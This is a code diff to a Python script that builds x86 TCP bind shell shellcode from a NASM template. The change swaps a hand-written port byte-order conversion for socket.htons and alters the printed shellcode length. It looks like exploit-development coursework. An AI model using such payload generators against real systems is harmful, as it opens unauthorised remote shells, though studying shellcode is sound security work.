@@ -1,25 +1,10 @@
 import argparse
 import sys
 import os
-
-def convert_to_hex(port):
-	
-	# Get hex value of port number
-	val = hex(port)[2::]
-	
-	# If the length is not divisible by two e.g. if a three-digit
-	# port such as 443 (0x1bb) is chosen, pad with an additional 0.
-	if not len(val) % 2 == 0:
-		val = "0" + val
-
-	# Convert port to little endian format
-	b = bytearray.fromhex(val)[::-1]
-	port_le = ''.join(format(x, '02x') for x in b)	
-
-	return "0x" + port_le
+import socket
 
 def set_port(port):
-	port = convert_to_hex(port)
+	port = hex(socket.htons(port))
 	asm = open("tcp_bind_shell_x86.nasm", 'rt')
 	data = asm.read()
 	data = data.replace('PORT', port)
@@ -35,7 +20,7 @@ def gen_shellcode():
 
 def print_shellcode(shellcode, port):
 	print("[*] Generating shellcode for TCP bind shell on port %s" % port)
-	print("[*] Shellcode length: %d bytes" % (len(shellcode.replace("\\x", "")) /2))
+	print("[*] Shellcode length: %d bytes" % ((len(shellcode.replace("\\x", "")) /2)-1))
 	print("[*] Checking for NULL bytes...\n%s" % ("[-] NULL bytes found." if "00" in shellcode else "[+] No NULL bytes detected!"))
 	print(shellcode)
 
